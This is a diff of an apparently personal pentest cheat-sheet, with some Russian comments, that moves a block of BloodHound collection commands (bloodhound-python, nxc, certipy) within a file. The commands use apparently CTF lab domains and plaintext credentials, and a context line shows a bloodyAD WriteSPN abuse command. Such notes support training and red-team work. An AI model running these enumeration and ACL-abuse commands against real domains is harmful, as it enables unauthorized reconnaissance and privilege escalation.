@@ -2,6 +2,20 @@
 ***************************************
 # BloodHound/SharpHound
 
+      bloodhound-ce-python -c all -ns 10.10.11.5 [-dc freelancer.htb] -d freelancer.htb --zip -u 'mikasaAckerman' -p 'IL0v3ErenY3ager'
+      bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' -c all (Дампим снаружи домена - нужны креды)
+
+      bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'  -c all
+
+     nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --bloodhound --collection All --dns-server dc01.tombwatcher.htb
+
+     nxc ldap 192.168.200.30 -u 'Администратор' -p '123qweASD!qazwsxedc' --bloodhound --collection All --dns-server 192.168.200.30 --kdcHost DC1.gage.local --dns-tcp
+
+
+     certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip  10.129.228.236  -bloodhound
+
+------------------------------------------------------------------------------------------------------------------------
+    sudo apt install bloodyad
 ! https://bloodhound.readthedocs.io/en/latest/installation/linux.html
 
 ! https://github.com/BloodHoundAD/BloodHound/releases
@@ -93,20 +107,6 @@ sudo bloodhound
     MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
 --------------------------------------------------------------------------------------------------------------------------------------------------
 
-      bloodhound-ce-python -c all -ns 10.10.11.5 [-dc freelancer.htb] -d freelancer.htb --zip -u 'mikasaAckerman' -p 'IL0v3ErenY3ager'
-        bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' -c all (Дампим снаружи домена - нужны креды)
-
-    bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'  -c all
-
-    nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --bloodhound --collection All --dns-server dc01.tombwatcher.htb
-
-    nxc ldap 192.168.200.30 -u 'Администратор' -p '123qweASD!qazwsxedc' --bloodhound --collection All --dns-server 192.168.200.30 --kdcHost DC1.gage.local --dns-tcp
-
-
-    certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip  10.129.228.236  -bloodhound
-
-------------------------------------------------------------------------------------------------------------------------
-    sudo apt install bloodyad
 
 # WriteSPN
     bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object svc_winrm servicePrincipalName -v 'http/anything'
